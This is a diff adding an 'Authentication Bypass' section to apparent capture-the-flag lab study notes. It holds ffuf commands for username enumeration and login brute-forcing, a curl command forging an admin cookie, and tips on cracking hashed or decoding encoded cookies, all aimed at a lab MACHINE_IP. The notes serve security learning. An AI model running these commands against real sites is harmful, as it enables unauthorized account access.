@@ -2648,3 +2648,41 @@ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.
 ```
 ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size}
 ```
+
+## Authentication Bypass
+Website authentication can be bypassed in different ways. These are critical as it often results to leaking personal data.
+
+### Username Enumeration
+Website error messages are great for building a list of valid usernames, as it verifies that such usernames already exist. 
+
+The ffuf tool below automates this process:
+```
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
+```
+
+### Brute Force
+Using the generated valid usernames, a brute force attack on the login page can be made:
+```
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
+```
+
+### Logic Flaw
+Authentication processes may sometimes contain logic flaws (i.e. logical path can by bypassed). 
+
+### Cookie Tampering
+Examining and editing cookies during an online session can lead to unauthenticated access, access to user's accounts, and elevated privileges.
+
+#### Plain Text Cookies
+Contents of cookies can be in plain text, which makes what they do obvious. E.g. Set-Cookie: admin=false; Max-Age=3600; Path=/.
+
+This command alters the cookie to gain admin privileges:
+```
+curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
+```
+
+#### Hashed Cookies
+Cookies are sometimes hashed. Common hashing methods used include md5, sha-256, sha-512, and sha1. Databases such as [Crackstation](https://crackstation.net/) are useful in cracking these hashes.
+
+#### Encoded Cookies
+Encoded text is reversible. Common encoding types include base32 and base64. E.g. Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/.
+
